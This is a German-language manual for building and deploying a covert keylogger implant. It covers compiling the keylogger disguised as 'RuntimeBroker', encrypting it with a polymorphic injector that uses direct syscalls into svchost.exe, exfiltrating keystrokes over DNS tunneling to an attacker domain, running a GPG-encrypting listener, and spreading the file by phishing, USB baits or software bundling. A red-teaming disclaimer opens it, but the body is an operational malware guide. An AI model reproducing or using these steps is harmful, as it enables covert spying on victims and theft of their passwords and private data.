# Handbuch zur Erstellung eines unauffälligen Überwachungswerkzeugs

**Version 4.0 "Stahlgeist"**

---

## !! WICHTIGER HINWEIS UND ETHISCHE WARNUNG !!

Dieses Dokument beschreibt die Erstellung eines hochentwickelten Software-Werkzeugs zu **ausschließlich akademischen, forschenden und defensiven Zwecken ("Red Teaming")**. Die hier beschriebenen Techniken sind fortgeschritten und können erheblichen Schaden anrichten, wenn sie missbraucht werden.

Die unbefugte Installation dieser Software auf einem System, das Ihnen nicht gehört oder für das Sie keine ausdrückliche, schriftliche Genehmigung zum Testen haben, ist **illegal** und wird in den meisten Rechtsordnungen streng bestraft.

Der Autor und der Ersteller dieses Dokuments übernehmen **keinerlei Haftung** für den Missbrauch der hierin enthaltenen Informationen. Handeln Sie verantwortungsbewusst und ethisch.

---

## 1. Architektur-Überblick

Das System besteht aus zwei Hauptkomponenten: dem **Implantat** (Client) und dem **Lauschposten** (Server).

*   **Das Implantat (`FinalPackage_v4.exe`):**
    *   Eine einzelne, polymorphe .exe-Datei.
    *   Verwendet einen getarnten Injektor, um einen Keylogger via **direkter Syscalls** in einen legitimen Systemprozess (z.B. `svchost.exe`) zu injizieren.
    *   Der Keylogger zeichnet Tastatureingaben auf.
    *   Die gesammelten Daten werden verschleiert und mit einem **Jitter** (zufälliger Verzögerung) über **DNS-Tunneling** an den Lauschposten gesendet.
    *   Die Kommunikation ist Einweg (Client -> Server).

*   **Der Lauschposten (`listener.py`):**
    *   Ein passiver DNS-Sniffer, der auf einem kontrollierten Server läuft.
    *   Er fängt die DNS-Anfragen des Implantats ab.
    *   Er extrahiert die Daten, **verschlüsselt sie sofort mit GPG** und speichert sie in einer sicheren Log-Datei.
    *   Die gesammelten Daten können nur offline mit einem privaten GPG-Schlüssel entschlüsselt werden.

---

## 2. Voraussetzungen

### 2.1. Entwicklungs-PC (Windows)

*   **Python 3.x:** [python.org](https://www.python.org/downloads/)
*   **PyInstaller:** `pip install pyinstaller`
*   **PyCryptodome:** `pip install pycryptodome`
*   **DNSPython:** `pip install dnspython`

### 2.2. Lauschposten-Server (Linux, z.B. Debian/Ubuntu VPS)

*   **Python 3.x:** `sudo apt-get install python3 python3-pip`
*   **GnuPG:** `sudo apt-get install gnupg`
*   **Scapy:** `pip3 install scapy`
*   **python-gnupg:** `pip3 install python-gnupg`
*   Eine registrierte **Domain** und die Möglichkeit, deren DNS-Records zu bearbeiten.

### 2.3. Sicherer Offline-PC (zur Entschlüsselung)

*   Eine GPG-Software (z.B. `Gpg4win` für Windows oder `gpg` auf Linux).

---

## 3. Teil 1: Die Waffe schmieden (Client-Seite)

Dieser Prozess erzeugt die finale `FinalPackage_v4.exe`.

### Schritt 1.1: Den Keylogger konfigurieren (`keylogger.py`)

1.  Öffnen Sie die Datei `keylogger.py`.
2.  **Konfigurieren Sie Ihre Kontrolldomain:**
    *   Kodieren Sie Ihre Domain (z.B. `logs.meine-geheime-domain.net`) in Base64. Unter Linux: `echo -n "logs.meine-geheime-domain.net" | base64`. Unter Windows können Sie einen Online-Encoder verwenden.
    *   Ersetzen Sie den Wert der Variable `ENCODED_CONTROL_DOMAIN` durch Ihren Base64-String.

### Schritt 1.2: Die Payload kompilieren

Führen Sie in der Kommandozeile den folgenden Befehl aus, um den Keylogger in eine .exe zu kompilieren.

```bash
pyinstaller --noconsole --onefile --name "RuntimeBroker" keylogger.py
```

Im `dist`-Verzeichnis finden Sie nun die `RuntimeBroker.exe`.

### Schritt 1.3: Den polymorphen Injektor erstellen

Dieses Skript verschlüsselt die `RuntimeBroker.exe` und generiert einen einzigartigen Injektor.

1.  Stellen Sie sicher, dass die `_injector_syscall.py` und die `crypter.py` im Hauptverzeichnis liegen.
2.  Führen Sie den Krypter aus:
    ```bash
    python crypter.py
    ```
3.  Dieses Skript erzeugt eine neue Datei: `injector_crypted.py`. Diese Datei enthält nun die verschlüsselte Payload und den einzigartigen AES-Schlüssel.

### Schritt 1.4: Die finale Waffe kompilieren

Kompilieren Sie den soeben erstellten, einzigartigen Injektor.

```bash
pyinstaller --noconsole --onefile --name "FinalPackage_v4" injector_crypted.py
```

**Ergebnis:** Die Datei `dist\FinalPackage_v4.exe` ist das fertige Implantat. Sie ist polymorph und bereit für den Einsatz.

---

## 4. Teil 2: Den Lauschposten einrichten (Server-Seite)

### Schritt 2.1: GPG-Schlüsselpaar generieren

Führen Sie dies auf Ihrem **sicheren Offline-PC** aus.

1.  **Schlüssel generieren:**
    ```bash
    gpg --full-generate-key
    ```
    Wählen Sie RSA/RSA, 4096 Bit, und vergeben Sie eine sichere Passphrase.

2.  **Öffentlichen Schlüssel exportieren:**
    *   Finden Sie Ihre Key-ID: `gpg --list-keys`
    *   Exportieren Sie den Schlüssel: `gpg --armor --export IHRE_KEY_ID > public.key`

### Schritt 2.2: Server vorbereiten und konfigurieren

1.  Verbinden Sie sich mit Ihrer Linux-VPS.
2.  Installieren Sie alle unter 2.2 genannten Pakete.
3.  Erstellen Sie ein Verzeichnis für den Lauschposten, z.B. `/opt/listener`.
4.  Übertragen Sie die `listener.py`-Datei und Ihre soeben erstellte `public.key`-Datei in dieses Verzeichnis.
5.  Öffnen Sie `listener.py` und passen Sie die Variable `CONTROL_DOMAIN` an die Domain an, die Sie in Schritt 1.1 verwendet haben.

### Schritt 2.3: DNS-Konfiguration

Konfigurieren Sie die DNS-Records Ihrer Domain bei Ihrem Registrar.

*   **A-Record:** Erstellen Sie einen A-Record, der eine Subdomain (z.B. `ns1.meine-geheime-domain.net`) auf die IP-Adresse Ihres Lauschposten-Servers zeigt.
*   **NS-Record:** Erstellen Sie einen NS-Record, der Ihre Kontrolldomain (z.B. `logs.meine-geheime-domain.net`) auf die soeben erstellte Subdomain (`ns1.meine-geheime-domain.net`) verweist.

*Es kann einige Zeit dauern, bis diese DNS-Änderungen weltweit propagiert sind.*

### Schritt 2.4: Lauschposten starten

Führen Sie im Verzeichnis `/opt/listener` auf Ihrem Server den folgenden Befehl aus:

```bash
sudo python3 listener.py
```

Der Server ist nun aktiv und lauscht. Eingehende Daten werden in `exfiltrated_data.log.gpg` verschlüsselt gespeichert.

---

## 5. Teil 3: Einsatz und Datenabruf

### Schritt 5.1: Infiltration

Verbreiten Sie die `FinalPackage_v4.exe` über einen geeigneten Vektor (z.B. gezieltes Phishing, USB-Köder, Software-Bündelung) auf dem Zielsystem.

### Schritt 5.2: Daten entschlüsseln

1.  Übertragen Sie die `exfiltrated_data.log.gpg` von Ihrem Lauschposten-Server auf Ihren sicheren Offline-PC.
2.  Entschlüsseln Sie die Datei im Terminal:
    ```bash
    gpg --decrypt exfiltrated_data.log.gpg
    ```
3.  Geben Sie Ihre GPG-Passphrase ein. Die dekodierten Log-Einträge werden angezeigt.

---
**ENDE DES DOKUMENTS**
--- 